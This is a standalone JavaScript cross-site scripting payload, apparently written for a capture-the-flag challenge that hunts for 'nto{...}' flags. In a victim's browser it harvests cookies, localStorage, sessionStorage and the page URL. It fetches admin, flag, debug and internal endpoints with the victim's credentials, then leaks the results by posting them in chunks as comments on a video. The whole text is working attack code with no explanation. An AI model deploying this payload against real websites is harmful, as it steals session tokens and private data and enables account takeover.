(async () => {
  const log = [];
  const add = (k, v) => { if (v) log.push(k + "=" + v); };
  try { add("cookie", document.cookie); } catch (e) {}
  try { add("ls", JSON.stringify(localStorage)); } catch (e) {}
  try { add("ss", JSON.stringify(sessionStorage)); } catch (e) {}
  try { add("url", location.href); } catch (e) {}
  const id = (document.querySelector(".watch-layout") || {}).dataset?.videoId
           || location.pathname.split("/").pop();
  const urls = ["/", "/admin", "/flag", "/api/flag", "/me", "/api/me",
    "/library", "/review", "/moderation", "/api/videos", "/robots.txt",
    "/config", "/debug", "/internal", "/reviewer", "/api/reviewer",
    location.pathname];
  const bodies = [];
  bodies.push(document.documentElement.outerHTML);
  await Promise.all(urls.map(u =>
    fetch(u, { credentials: "include" })
      .then(r => r.text()).then(t => bodies.push("@" + u + ":" + t))
      .catch(() => {})
  ));
  // hunt for flag
  const flags = new Set();
  const re = /nto\{[^}]{0,120}\}/g;
  for (const b of bodies.concat(log)) { let m; while ((m = re.exec(b))) flags.add(m[0]); }
  // build exfil chunks (<=450 chars) prioritizing flags
  const parts = [];
  if (flags.size) parts.push("FLAG " + [...flags].join(" "));
  parts.push(log.join(" | ").slice(0, 1200));
  const chunks = [];
  for (const p of parts) for (let i = 0; i < p.length; i += 440) chunks.push(p.slice(i, i + 440));
  for (let i = 0; i < Math.min(chunks.length, 6); i++) {
    try {
      await fetch("/api/videos/" + id + "/comments", {
        method: "POST", credentials: "include",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text: "X" + i + ":" + chunks[i] })
      });
    } catch (e) {}
  }
})();
